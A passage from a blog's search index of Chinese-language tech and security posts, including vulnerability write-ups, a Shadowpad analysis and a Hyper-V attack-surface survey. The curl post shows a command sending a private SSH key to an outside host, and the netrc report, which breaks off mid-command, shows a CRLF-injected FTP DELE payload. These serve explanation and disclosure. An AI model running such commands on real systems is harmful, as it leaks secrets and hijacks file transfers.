拼接过多独立显示器——光标移动会变得麻烦 黄金配置方案\r推荐采用\u0026quot;1+2\u0026quot;三屏布局：\n中央主屏：27英寸2560×1440分辨率（1440p/QHD/2K），位于视觉焦点中心 两侧辅屏：各配一台27英寸LG DualUp竖屏（16:18比例），稍向内倾斜 1440p vs 4K分辨率\r在臂长距离下，1440p无需缩放即可清晰显示所有内容。4K屏幕虽然显示效果更优，但存在软件兼容性问题。1440p在27英寸屏上提供恰到好处的空间，且无需担心缩放不一致。\n竖屏显示器的局限\r竖屏配置能增加纵向空间，但水平空间有限。适合放置代码编辑器或文档，但不适合宽幅应用窗口或并排窗口。\n单块大屏的弊端\r虽然30英寸以上的超宽屏（如3440×1440分辨率）能提供高PPI和广阔水平空间，但存在以下问题：\n窗口管理困难，需要依赖分屏软件 应用全屏时会占满整个视野 笔记本外接时断开连接会导致窗口位置丢失 曲面屏的争议点\r优点：\n沉浸式体验 减少头部转动 缺点：\n边缘窗口显示不自然 反光问题严重 可能引发眩晕感 搬运风险高 价格昂贵 双屏配置方案\r替代方案可采用：\n一大一小双屏（精简版黄金配置） 两块相同大屏（需更多头部转动） 配置建议：\n避免将双屏接缝置于正前方 主屏居中放置IDE 副屏用于文档/调试器/程序输出 笔记本外接方案\r预算有限时可选择：\n24英寸外接屏+笔记本屏幕 需将笔记本抬高至视线水平 建议使用外接键盘 显示器型号推荐\r主屏首选：Dell Ultrasharp 27英寸\n2560×1440 LED面板 坚固耐用结构 多功能支架 性价比高 辅屏旗舰：LG DualUp\n16:18特殊比例（2560×2880） 支持横竖切换 额外空间适合放置通讯类窗口 竖屏模式可显示更多代码行 ","date":"2025-08-03T06:31:56+08:00","permalink":"http://localhost:1313/p/%E7%BC%96%E7%A8%8B%E7%90%86%E6%83%B3%E6%98%BE%E7%A4%BA%E5%99%A8%E9%85%8D%E7%BD%AE%E6%96%B9%E6%A1%88%E5%B7%B2%E8%A7%A3%E5%86%B3/","title":"编程理想显示器配置方案（已解决！）"},{"content":"CMS安全态势分析\r报告显示56%被黑网站的核心CMS平台已安装最新补丁。但深入分析各CMS版本状态后发现问题依然严峻：\nWordPress：虽然36.7%的受感染站点存在版本滞后（较2016年下降24.3%），但其仍占被黑网站的60%，反映出第三方生态的安全隐患 电商平台：Magento(83.1%)、OpenCart(91.3%)和PrestaShop(97.2%)的版本滞后率惊人，这些处理支付交易的系统存在核心漏洞风险，且升级过程存在兼容性难题 主要攻击向量\r凭证填充攻击：通过暴力破解获取管理员权限 第三方组件漏洞：2018年发现196个漏洞，其中： WordPress插件116个漏洞（17%为高危） Joomla!扩展28个高危漏洞 Magento第三方模块正成为新兴攻击入口 黑名单机制缺陷\r仅11%的被黑网站触发黑名单（同比下降6%） 各平台检测率差异显著： Norton：46.1% Google：10.4% McAfee：下降4% 恶意软件家族分布\r后门程序：68%的感染站点存在（主要用于维持持久访问） SEO垃圾注入：同比增长78%，主要篡改： index.php（34.5%）：隐藏文件包含攻击 functions.php（13.5%）：SEO垃圾注入器 wp-config.php（10.6%）：数据库凭证窃取 加密货币挖矿：33%为服务端PHP矿工，67%为客户端JS矿工（如CoinHive） 关键防御建议\r建立多黑名单平台监控（Google/Norton/Yandex等） 对核心文件（如wp-config.php）实施完整性校验 采用深度扫描清除隐藏后门 电商站点需严格遵守PCI DSS 6.2条款（关键补丁30天内部署） 报告完整数据见SUCURI 2018被黑网站报告，技术团队另提供恶意文件清理指南。\n","date":"2025-08-03T06:20:59+08:00","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90sucuri2018%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E8%B6%8B%E5%8A%BF%E6%8A%A5%E5%91%8Acms%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E5%AE%9E%E5%BD%95/","title":"深度解析SUCURI《2018被黑网站趋势报告》：CMS漏洞与恶意软件攻防实录"},{"content":"随着ChatGPT等大型语言模型（LLM）的兴起，开发者正将这些工具实际应用于代码编写和理解场景。编程语言虽然结构严谨，但AI辅助编码仍存在多重风险，这正是我们撰写本技术白皮书的核心动因。\n主要使用场景\r开发者主要通过三种方式使用这些工具：\n代码补全：自动完成函数或代码行 代码解释：解析现有代码逻辑 文档生成：自动创建技术文档 其中代码补全功能的风险最为显著，工具可能直接输出包含漏洞的代码片段。\n核心风险分析\r安全输出无保障\n研究证实（包括本文案例），这些工具会生成存在安全缺陷的代码。必须引入额外检测流程确保漏洞代码不会进入生产环境。\n一致性与可靠性问题\n工具的输出质量受历史代码质量影响。即使模型本身具备安全输出能力，低质量的上下文代码仍会导致漏洞输出。\n数据泄露风险\nGitHub Copilot等SaaS服务会收集IDE中的按键记录，包括：\n原始代码 注释内容 项目元数据\n这些数据可能被第三方存储分析，如图所示： 扩展建议\r本文仅列举部分风险，更详细的分析和缓解策略请下载完整版白皮书《Addressing Risks from AI Coding Assistants》。尽管研究主要针对GitHub Copilot和ChatGPT，但所述风险具有普适性，适用于各类AI编程辅助工具。\n特别警示：未来将有更多面向开发者的AI编程工具涌现，安全团队需要建立系统化的应对机制。\n","date":"2025-08-03T06:10:03+08:00","permalink":"http://localhost:1313/p/ai%E7%BC%96%E7%A8%8B%E5%8A%A9%E6%89%8B%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90%E4%B8%8E%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/","title":"AI编程助手风险分析与应对策略"},{"content":"二进制安全优化实践\r\u0026ldquo;这样存在毫无意义，安全地存在才有价值\u0026rdquo;（《麦克白》3.1）\n编译器不仅要生成高效代码，还必须生成安全代码。尽管编译器开发过程中经过严格测试和正确性认证，但其优化过程可能意外引入信息泄漏或删除程序员编写的安全关键操作。图1展示了CWE-733漏洞实例：编译器通过\u0026quot;死存储消除\u0026quot;优化移除了加密密钥清零操作，导致密钥可能被攻击者恢复。\n代码重用攻击的构建原理\r攻击者使用返回导向编程（ROP）和跳转导向编程（JOP）等技术绕过恶意代码注入防御。这些技术通过复用目标程序中的代码片段（gadgets）构建攻击载荷。每个gadget包含有效计算指令和终止分支指令（如ret/jmp），攻击者通过链式调用gadgets编写漏洞利用程序。图2展示了一个简单的ROP攻击链：\n研究发现总结\r通过分析GCC/clang编译的20个程序的1000多个变体，我们发现：\n85%的优化案例增加了gadget集合规模、效用或可组合性 主要根源来自两种行为：间接分支指令复制和代码布局变更 间接分支指令复制\rGCC的帧指针省略优化会复制返回指令（retn），如图3所示。虽然减少了代码大小和执行时间，但会引入更多可能被利用的gadgets。\n二进制布局变更\r优化导致的控制流指令位移变化可能意外编码间接分支指令（如0xC3对应retn）。如图4所示，x86_64的非对齐变长指令特性使得这些位移可能被解码为有效gadgets。\n解决方案：二进制安全优化\r我们在Egalito二进制重编译器中实现了五种优化方案：\n返回指令合并：合并函数内所有返回指令到单个实例 间接跳转合并：合并同目标寄存器的间接跳转 指令屏障扩展：消除跨预期指令的特殊用途gadgets 位移填充：消除跳转位移中的gadgets 函数重排序：消除调用偏移中的gadgets 实际效果：\n平均消除31.8%有用gadgets 78%变体中降低gadget集合整体效用 75%变体中消除至少一类特殊用途gadgets 零性能影响，平均仅增加6.1kB代码大小 结论\r编译器行为显著影响二进制gadget集合，但当前设计缺乏对潜在安全属性的关注。通过二进制重编译技术可以在不牺牲性能的前提下消除这些安全隐患。未来将研究寄存器分配等更多问题，并探索其对控制流完整性（CFI）等防御机制的辅助优化效果。\n","date":"2025-08-03T05:53:54+08:00","permalink":"http://localhost:1313/p/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%BC%98%E5%8C%96%E5%AE%9E%E8%B7%B5%E6%B6%88%E9%99%A4%E7%BC%96%E8%AF%91%E5%99%A8%E5%BC%95%E5%85%A5%E7%9A%84%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB%E9%9A%90%E6%82%A3/","title":"二进制安全优化实践：消除编译器引入的代码重用攻击隐患"},{"content":"toolsmith #130 - 使用Buscador进行OSINT调查\r首先，新年快乐！希望您拥有高效成功的2018年。作为开年之作，我将再次探讨开源情报(OSINT)技术。除微软信息安全主管的本职工作外，我还荣幸担任华盛顿国民警卫队J-2情报部门成员，结合J-6网络作战职能，OSINT在识别对手指标和红队评估目标方面具有重要价值。\nBuscador是由OSINT专家Michael Bazzell和David Wescott开发的Linux虚拟机预配置平台，集成了我们曾讨论过的Recon-ng、Spiderfoot等工具。1.1版本包含以下核心工具集：\n地理定位工具：Creepy（支持Twitter/Flickr等插件） 元数据分析：Metagoofil/ExifTool/pyExifToolGui 域名枚举：Knock/SubBrute 社交媒体挖掘：Tinfoleak/Instalooter 网页镜像：HTTrack/Wayback Exporter 实战测试\rCreepy定位分析\n配置Twitter插件搜索\u0026quot;holisticinfosec\u0026quot;，虽未获取精确坐标，但成功关联西雅图地区信息（图1-2）。对于开启地理标记的目标，该工具可绘制活动热力图。\nTinfoleak深度报告\n生成包含时间线、设备类型、话题标签的完整Twitter活动分析报告（图3），比原生API提供更丰富的元数据。\nMetagoofil文档情报\n对目标域扫描50份公开文档，输出作者/公司/修改记录等元数据（图6），堪称红队侦察必备工具，其效率超越传统Foca工具。\n技术亮点\r虚拟化支持：提供OVA镜像和ISO两种部署方式，通过QEMU转换后可在Hyper-V快速部署 工作流集成：所有工具通过左侧菜单栏统一调用，支持Instalooter采集图片→ExifTool解析→BleachBit清理的完整链条 即将更新：1.2版本将重构Firefox适配并新增特性，开发者透露正在筹备新作 重要提示：虽然OSINT工具威力强大，但务必遵守道德准则。公开文档中的元数据可能暴露敏感信息，建议发布前进行清理。\n该平台将分散的OSINT工具整合为标准化工作环境，极大提升了网络侦察效率。对于需要持续进行威胁情报分析的专业人员，Buscador堪称\u0026quot;一站式解决方案\u0026quot;。期待1.2版本带来更多创新功能。\n","date":"2025-08-03T05:42:44+08:00","permalink":"http://localhost:1313/p/osint%E5%88%A9%E5%99%A8buscador%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/","title":"OSINT利器Buscador：开源情报收集的瑞士军刀"},{"content":"技术架构突破\r即日起，您可将Amazon S3访问点挂载至Amazon FSx for OpenZFS文件系统，使存储在文件系统中的数据能够通过Amazon S3标准API（如GetObject/PutObject/ListObjectsV2）进行访问。该功能具有以下核心特性：\n统一数据访问层\r双协议支持：数据持续驻留FSx文件系统，同时支持NFS协议与S3 API并行访问 权限控制：每个S3访问点可配置独立IAM策略，支持VPC网络隔离和Block Public Access 无拷贝操作：消除传统ETL流程，直接对接S3生态的AI/ML服务（如Amazon Bedrock/SageMaker） 实现机制\r访问点配置：通过FSx控制台/AWS CLI创建S3访问点，系统自动生成桶别名（替代传统S3桶名） 服务集成： 1 2 3 4 # 示例：通过S3 API读取FSx数据 import boto3 s3 = boto3.client(\u0026#39;s3\u0026#39;) response = s3.get_object(Bucket=\u0026#39;fsx-access-point-alias\u0026#39;, Key=\u0026#39;report.pdf\u0026#39;) 性能表现：首字节延迟保持在毫秒级，吞吐量取决于FSx文件系统的预配置容量 典型应用场景\rRAG工作流：将FSx中的PDF文档直接作为Amazon Bedrock知识库源 数据分析：通过Athena/Glue查询文件系统数据，无需转换为S3存储格式 Spark处理：开源框架可直接使用S3 API访问FSx数据集 技术参数\r特性 指标 访问点数量 单个文件系统支持数百个访问点 延迟水平 与原生S3访问性能一致（毫秒级） 区域支持 覆盖北美/欧洲/亚太8个区域 注意：该功能会产生额外的S3请求计费，但免除数据迁移产生的传输费用。详细定价参见FSx for OpenZFS定价页。\n","date":"2025-08-03T05:26:35+08:00","permalink":"http://localhost:1313/p/amazon-fsx-for-openzfs%E7%8E%B0%E6%94%AF%E6%8C%81%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEamazon-s3%E6%95%B0%E6%8D%AE%E6%97%A0%E9%9C%80%E8%BF%81%E7%A7%BB/","title":"Amazon FSx for OpenZFS现支持直接访问Amazon S3数据（无需迁移）"},{"content":"在这篇文章中，我们将探讨curl中一个鲜为人知的特性，该特性导致了Burp Suite Pro和Google Chrome的本地文件泄露漏洞。虽然我们早已为Burp Suite发布了补丁，但怀疑该技术可能对利用其他具有\u0026quot;复制为curl命令\u0026quot;功能或从命令行调用curl的应用程序有所帮助。该漏洞由Paul Mutton通过我们的漏洞赏金计划私下报告，并慷慨地允许我们发布这篇分析报告。\nBurp Suite用户经常构造复杂的HTTP请求来演示网站漏洞。为了更轻松地与他人共享这些概念验证漏洞利用，我们提供了\u0026quot;复制为curl命令\u0026quot;功能，可生成复制Burp Suite中请求的curl命令。\n例如，给定以下请求：\n1 2 3 4 5 6 POST / HTTP/1.1 Host: portswigger.net Content-Type: application/x-www-form-urlencoded Content-Length: 7 foo=bar 点击\u0026quot;复制为curl命令\u0026quot;后，Burp Suite会生成以下命令并复制到剪贴板：\n1 2 3 4 5 6 7 curl -i -s -k \\ -X $\u0026#39;POST\u0026#39; \\ -H $\u0026#39;Host: portswigger.net\u0026#39; \\ -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; \\ -H $\u0026#39;Content-Length: 7\u0026#39; \\ --data-binary $\u0026#39;foo=bar\u0026#39; \\ $\u0026#39;https://portswigger.net/\u0026#39; 您可以将此命令粘贴到终端中，在Burp Suite外部重新发出请求。我们非常注意转义这些数据，以避免用户因恶意请求注入额外的shell命令或任意curl参数而受到攻击。但不幸的是，存在一个更微妙的问题。您能发现吗？\n答案一如既往地藏在友好的手册中：\n1 2 3 --data-binary \u0026lt;data\u0026gt; 这将完全按指定方式发送数据，不进行任何额外处理。 如果数据以字母@开头，其余部分应为文件名。 因此，以下命令是安全的：\n1 2 3 curl --data-binary \u0026#39;/home/albinowax/.ssh/id_rsa\u0026#39; --trace-ascii - https://02.rs/ =\u0026gt; 发送数据，28字节(0x1c) 0000: /home/albinowax/.ssh/id_rsa 而这个就不那么安全了：\n1 2 3 4 5 curl --data-binary \u0026#39;@/home/albinowax/.ssh/id_rsa\u0026#39; --trace-ascii - https://02.rs/ =\u0026gt; 发送数据，662字节(0x296) \u0026gt; -----BEGIN RSA PRIVATE KEY----- .b3BlbnNzaC1rZXktdjEA.... (不是我的真实私钥) 我们在2020.5.1版本中修复了这个漏洞，如果请求体以@符号开头，就改用更新、更安全但支持较少的\u0026ndash;data-raw标志。\n我们很幸运，因为在Burp Suite中利用此漏洞需要相对较多的用户交互——攻击者需要诱导用户访问恶意网站，将精心设计的请求复制为curl命令，然后通过命令行执行。如果网站使用curl并带有攻击者控制的请求体，则可能产生更大的影响，因此在SSRF测试期间绝对值得关注。@文件读取行为也适用于标头，因此在允许定义自定义标头的网站上可能有用。\n尽管这个特性让我们(和Chrome)感到意外，但它已完全记录在案，因此我们不认为这是curl本身的漏洞。这让我想起了服务器端模板注入，在那里沙箱逃逸可能就像阅读一个被其他人忽视的手册页面一样简单。\n再次感谢Paul分享这个很酷的技术。下次见！\n","date":"2025-08-03T05:15:26+08:00","image":"https://portswigger.net/cms/9a8b6e0b1d8b5b5a/cover-image/research.jpg","permalink":"http://localhost:1313/p/curl%E7%89%B9%E6%80%A7%E6%9B%9D%E5%85%89burp-suite%E5%92%8Cgoogle-chrome%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","title":"curl特性曝光Burp Suite和Google Chrome本地文件泄露漏洞"},{"content":"关键发现\r欧洲两起事件响应案例涉及与中国高级威胁组织关联的Shadowpad恶意软件。研究发现该恶意软件在7个月内攻击了全球15个国家的21家企业，其中制造业占比超50%。 攻击者通过弱密码爆破VPN并绕过证书型多因素认证（具体方法未知）入侵网络，最终在域控制器部署Shadowpad。 部分案例中，攻击者部署了此前未公开的新型勒索软件家族，其加密算法与Kodex Evil Extractor工具有显著差异，可能是攻击者的误导手段。 攻击链分析\r初始入侵\r攻击路径：VPN → 弱密码爆破/多因素认证绕过 → 获取管理员权限 → 部署Shadowpad 特殊手段：在证书型MFA环境下仍成功突破（可能通过预先获取有效证书） 恶意工具集\rShadowpad变种：\n新增反调试技术（6种检测机制，包括PEB检查、RDTSC指令计时等） 采用DoH（DNS over HTTPS）隐藏C2通信 配置结构升级：新增3字节标识符和类型字段（含5种加密数据类型） 新型勒索软件：\n加载链：合法usysdiag.exe → 恶意sensapi.dll → 加密载荷usysdiag.dat 加密机制：每文件生成随机AES密钥 → RSA公钥加密后附加到文件末尾 伪装手段：复制Kodex勒索说明文档界面但实际算法完全不同 后期工具：\nCQHashDumpv2：提取SAM数据库 Impacket工具包：WmiExec远程执行 NTDSUtil：转储Active Directory数据库（生成aaaa.dit文件） 技术对抗演进\r反分析增强：利用卷序列号加密内存载荷，删除磁盘原始文件 C2隐蔽通信：历史版本使用8个C2域名，当前仅发现updata.dsqurey[.]com活跃 载荷投递：滥用11种合法签名程序（如NVIDIA/微软/华硕的旧版软件）进行DLL侧加载 受害者画像\r行业 数量 地域分布 制造业 11 欧洲(9)、亚洲(8) 交通运输 2 中东(3)、南美(1) 出版业 2 防御建议\r制造业等高危行业应重点检查VPN的证书型MFA实现漏洞 监控异常进程（如RoboTaskBarIcon.exe加载roboform-x64.dll） 部署具备内存取证能力的EDR产品对抗无文件攻击 值得注意的是，所有勒索支付地址均未观测到资金流入，表明攻击者可能以数据窃取为主要目的，勒索仅为干扰手段。\n完整IOC列表和检测规则可通过Trend Vision One平台获取。\n","date":"2025-08-03T05:04:21+08:00","image":"https://www.trendmicro.com/content/dam/trendmicro/global/en/images/photography/technology/abstract-security-background.jpg","permalink":"http://localhost:1313/p/shadowpad%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8D%87%E7%BA%A7%E5%AF%BC%E8%87%B4%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E9%83%A8%E7%BD%B2%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/","title":"Shadowpad恶意软件升级导致勒索软件部署：新型攻击手法深度分析"},{"content":"在Linux上运行原版Intercepter-NG\r操作指南（已更新！）\r[1] 下载Wine用的WinPcap封装库及libpcap-dev\n1 2 wget http://sniff.su/wine_pcap_dlls.tar.gz apt-get install libpcap-dev 如果是i386版Kali系统，直接跳转至步骤[3]。\n[2] Kali x64系统需执行以下命令：\n1 2 3 4 dpkg --add-architecture i386 apt-get update apt-get install wine-bin:i386 apt-get install tcpdump:i386 [3] 将dll文件复制到wine库目录\n1 2 cp wpcap.dll.so /usr/lib/i386-linux-gnu/wine cp packet.dll.so /usr/lib/i386-linux-gnu/wine [4] 安装winetricks并配置\n1 2 3 apt-get install winetricks winetricks cc580 ethtool --offload eth0 rx off tx off [5] 下载Intercepter-NG 0.9.9并移除冲突dll\n1 2 3 rm wpcap.dll rm packet.dll wine Intercepter-NG.exe 常见问题解答\r文件缺失错误\n确保从压缩包完整提取所有文件，包括packet.dll.so\n配置文件报错\n必须以root用户身份（非sudo）在程序所在目录直接运行\nKali 2.0兼容性问题\n建议使用Wine 1.4版本运行程序\n64位系统支持\n需完整安装32位兼容库：\n1 2 dpkg --add-architecture i386 apt-get install ia32-libs -y 注意：程序开发者不提供Linux系统或第三方应用的配置支持，本教程仅适用于Kali 1.x/2.0系统环境。\n","date":"2025-08-03T04:53:11+08:00","permalink":"http://localhost:1313/p/%E5%9C%A8linux%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%89%88intercepter-ng%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7/","title":"在Linux上运行原版Intercepter-NG网络嗅探工具"},{"content":"Aaron Yoo — Anvill反编译器\r加州大学洛杉矶分校\n我在Anvill反编译器中添加了一个生成LLVM位码函数\u0026quot;JSON规范\u0026quot;的工具。这些规范告知Anvill函数参数和返回值等重要值的物理位置（寄存器或内存）。典型规范示例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 { \u0026#34;arch\u0026#34;: \u0026#34;amd64\u0026#34;, \u0026#34;functions\u0026#34;: [ { \u0026#34;demangled_name\u0026#34;: \u0026#34;test(long, long)\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;_Z4testll\u0026#34;, \u0026#34;parameters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;param1\u0026#34;, \u0026#34;register\u0026#34;: \u0026#34;RDI\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;l\u0026#34; }, ... 通过该项目，我深入了解了ABI规范，并解决了高级参数分散在多个机器寄存器中的技术难题。\nPaweł Płatek — DeepState与Python\rAGH科技大学\n我主要修复了DeepState Python部分的构建问题：\nCMake：修正构建选项，增加仅构建示例的选项 Docker：采用多阶段构建，支持Honggfuzz和Angora 模糊测试执行器：统一参数处理，重新实现日志系统和运行时统计 测试体系：创建基础测试用例验证执行器功能 文档：拆分文档结构，新增模糊测试使用指南 Philip Zhengyuan Wang — Manticore\r马里兰大学\n我开发了\u0026quot;mcorepv\u0026quot;工具实现Manticore的云化部署：\n通过Ansible自动配置DigitalOcean云主机 使用Protobuf协议实时传输分析状态 开发终端用户界面(TUI)监控运行状态 实现工作目录自动同步和日志回传 当前待解决问题包括SSH端口转发优化和TUI信息展示改进。\nSamuel Caccavale — Go代码分析\r东北大学\n开发基于AST和SSA的Go代码扫描器，可检测以下模式：\n1 2 3 4 5 unsafe, ok := i.(string) fmt.Println(ok) if true { fmt.Println(unsafe) // 危险的类型断言使用 } 相比GoSec等工具，能更精确识别类型断言值的上下文使用安全。\nTaylor Pothast — Mishegos\r范德堡大学\n将x86_64解码器模糊测试工具Mishegos的输出格式：\n从JSON改为紧凑二进制格式 开发mish2jsonl转换工具保持向后兼容 更新分析工具处理新增的符号字段 Thomas Quig — Crytic与Slither\r伊利诺伊大学香槟分校\n将Slither的智能合约升级检查集成到Crytic CI服务：\n实现合约版本选择界面 检查代理合约模式的风险点（如存储变量对齐） 输出标准化JSON格式的检测结果 William Wang — OpenSSL与Anselm\r加州大学洛杉矶分校\n开发OpenSSL API误用检测工具Anselm：\n编写LLVM Pass构建API调用图 实现基础启发式规则（如密码上下文初始化检查） 支持跨语言OpenSSL绑定分析 未来计划增强参数/返回值分析能力，完善开发者接口。\n","date":"2025-08-03T04:42:16+08:00","permalink":"http://localhost:1313/p/trail-of-bits-2020%E5%86%AC%E5%AD%A3%E5%AE%9E%E4%B9%A0%E9%A1%B9%E7%9B%AE%E4%BA%AE%E7%82%B9%E4%BB%8E%E5%8F%8D%E7%BC%96%E8%AF%91%E5%99%A8%E5%88%B0%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/","title":"Trail of Bits 2020冬季实习项目亮点：从反编译器到智能合约安全"},{"content":"攻击虚拟机工作进程 | MSRC博客\r在过去一年中，我们投入了大量时间使Hyper-V研究更易于开展。首篇博客《Hyper-V研究第一步》描述了调试管理程序的工具和设置，并分析了虚拟化堆栈组件的攻击面。随后发表的《Hyper-V中准虚拟化设备的模糊测试》聚焦于VSPs-VSCs通过VMBus的通信机制，披露了根分区内核(vpcivsp.sys)中vPCI VSP的客户机到主机漏洞。八月，Joe Bialek在Black Hat上的精彩演讲展示了如何利用虚拟机工作进程(VMWP)中IDE模拟器的另一个漏洞。现在，让我们深入探究VMWP内部机制。\n虚拟机工作进程是什么？\r虚拟化堆栈中最大的攻击面之一就实现在根分区的用户空间——虚拟机工作进程(VMWP.exe)。每个虚拟机对应一个VMWP.exe进程实例，其主要组件包括：\nvSMB服务器 Plan9文件系统 集成组件(IC) 虚拟设备（模拟器/非模拟设备） VMWP可视为微软的\u0026quot;QEMU\u0026quot;式进程，负责实现模拟/非模拟设备。这类组件通常非常复杂，而复杂实现往往容易出错\u0026hellip;\nVMWP内部机制\r整体架构\r工作进程通过虚拟化基础设施驱动(vid.sys)与hypervisor通信。VID使用hypercall向hypervisor发送管理命令，包括：\n创建/删除分区 挂起/恢复分区 动态内存管理 添加/删除虚拟处理器 VID通知分发器(VND)是关键组件，允许客户端注册并接收来自客户机的动作通知。x64架构支持的VID通知类型包括：\n1 2 3 4 5 6 7 8 typedef enum _VID_MESSAGE_TYPE { VidMessageMbpAccess = 0x0001, VidMessageException = 0x0002 | VID_MESSAGE_TYPE_FLAG_INTERCEPT, VidMessageTripleFault = 0x0003 | VID_MESSAGE_TYPE_FLAG_INTERCEPT, VidMessageExecuteInstruction = 0x0004 | VID_MESSAGE_TYPE_FLAG_INTERCEPT, VidMessageMmio = 0x0005 | VID_MESSAGE_TYPE_FLAG_INTERCEPT, //...共18种消息类型 } VID_MESSAGE_TYPE; 关键组件\r指令模拟器\rEmulatorVP类实现了x86/x64指令模拟，包含约250个函数，主要分为：\nEmulatorVp::Execute*Instruction：指令执行模拟入口 EmulatorVP::Execute*Op：具体操作处理 EmulatorVp::ExecuteIs*：RFLAGS状态检查 EmulatorVP::Decode*：指令解码器 典型调用栈示例：\n1 2 3 4 5 VndCompletionThread └─VndCompletionHandler::HandleVndCallback └─EmulatorVp::DispatchMmioOperation └─EmulatorVp::ExecuteGEInstruction 虚拟设备\r虚拟设备分为三类：\n模拟设备：完整模拟硬件设备（如e1000网卡） 准虚拟化设备：专为虚拟环境设计的虚拟设备 直通设备：允许客户机直接访问物理硬件 主要设备模拟DLL及其功能：\nDLL名称 功能范围 模拟设备示例 VmEmulatedDevices.dll 1500+函数 PIIX芯片组、DMA控制器、PS/2键盘 vmuidevices.dll 1500+函数 视频设备、输入管理器、HID设备 vmEmulatedNic.dll 网络设备 DEC 21041/21140A/21143网卡 VmEmulatedStorage.dll 存储设备 IDE控制器、光驱、软盘驱动器 PCI配置访问示例\r1 2 3 4 5 6 7 8 STDMETHOD(NotifyPciConfigAccess)( _In_ PCI_BUS_NUMBER Bus, _In_ PCI_DEVICE_NUMBER DeviceNumber, _In_ PCI_FUNCTION_NUMBER FunctionNumber, _In_ UINT16 InRegAddress, _In_ BOOLEAN InIsWrite, _Inout_ UINT32* IoData ); 该接口由多个设备类实现，包括：\n1 2 3 vmchipset!VmEmu::WCL::PciHandler::NotifyPciConfigAccess VmEmulatedStorage!IdeControllerDevice::NotifyPciConfigAccess vmemulateddevices!VideoS3Device::NotifyPciConfigAccess 调试实践\r通过内核调试器执行out 0x1f0, 0x41414141指令，在VMWP中设置断点：\n1 bp vmemulatedstorage!IdeControllerDevice::NotifyIoPortWrite 可观察到完整的IO端口写入调用链。\n漏洞案例研究\rCVE-2018-0888\r电池模拟器中的未初始化内存漏洞：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 void BatteryEmulator::MmioRead( std::uint64_t /* RangeBase */, std::uint64_t RangeOffset, std::uint64_t NumberOfBytes, _Out_writes_bytes_(NumberOfBytes) void* ReadBuffer ) noexcept { UINT32 readValue = 0; if (NumberOfBytes != 4) { return; // 未初始化ReadBuffer } ... } 攻击者可利用此漏洞读取主机内存敏感信息。\nVMWP加固措施\r微软实施了以下安全防护：\n控制流防护(CFG)： 启用CFG导出抑制 强制CFG校验 任意代码防护(ACG)： 禁止分配/映射可执行页面 禁止修改可执行页面保护 代码完整性防护(CIG)： 禁止加载未签名DLL 移除SeImpersonatePrivilege权限 尽管有这些缓解措施，攻击者仍可能通过ROP链或文件系统API等途径实现利用。\n通过本文分析，我们希望研究人员能更深入地探索虚拟化堆栈安全。如有问题，欢迎通过Twitter(@AmarSaar)联系作者Saar Amar。\n","date":"2025-08-03T04:31:08+08:00","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90hyper-v%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B7%A5%E4%BD%9C%E8%BF%9B%E7%A8%8Bvmwp%E6%94%BB%E5%87%BB%E9%9D%A2%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/","title":"深入解析Hyper-V虚拟机工作进程(VMWP)攻击面与漏洞挖掘"},{"content":"统计目录中Java代码行数\r我最近需要统计一个目录中所有Java代码文件的总行数（包括子目录）。通过组合Linux的find和wc命令，可以轻松实现这个需求：\n1 find . -type f -name \u0026#39;*java\u0026#39; -print0 | wc -l --files0-from=- 这个命令的工作原理是：\nfind命令递归查找当前目录(.)下所有扩展名为.java的文件 -print0参数用null字符分隔文件名，可以正确处理包含空格的文件名 结果通过管道传递给wc -l命令统计总行数 --files0-from=-参数告诉wc从标准输入读取文件名 示例输出：\n1 2 3 4 . . 56 ./App.java 550 total 这个简单的命令组合可以快速统计项目中的代码量，对于评估项目规模或代码审查非常有用。\n","date":"2025-08-03T04:19:32+08:00","permalink":"http://localhost:1313/p/%E7%BB%9F%E8%AE%A1%E7%9B%AE%E5%BD%95%E4%B8%ADjava%E4%BB%A3%E7%A0%81%E8%A1%8C%E6%95%B0%E7%9A%84%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/","title":"统计目录中Java代码行数的简便方法"},{"content":"curl netrc crlf注入漏洞报告\r摘要\rcurl允许在netrc文件的登录和密码字段中编码CR和LF字符。当攻击者能够影响netrc文件内容时，可通过在登录名或密码中注入CRLF来实现FTP命令注入。POP3协议同样可能受影响但未经测试。\n漏洞复现步骤\r创建包含恶意payload的netrc文件： 1 2 3 machine localhost login alice password \u0026#34;alicespassword\\r\\nDELE pocfile.txt\u0026#34; 启动测试用的FTP服务器： 1 echo -ne \u0026#34;220 \\r\\n331 \\r\\n\u0026#34; | nc -v -l -p 9999 使用受影响curl版本发起请求： 1 curl -v --netrc-file netrc 